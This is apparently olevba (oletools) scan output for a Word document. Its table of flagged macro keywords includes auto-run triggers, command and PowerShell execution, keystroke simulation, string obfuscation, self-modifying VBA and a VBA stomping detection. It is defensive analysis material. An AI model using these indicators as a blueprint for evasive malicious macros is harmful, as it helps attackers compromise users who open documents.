+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

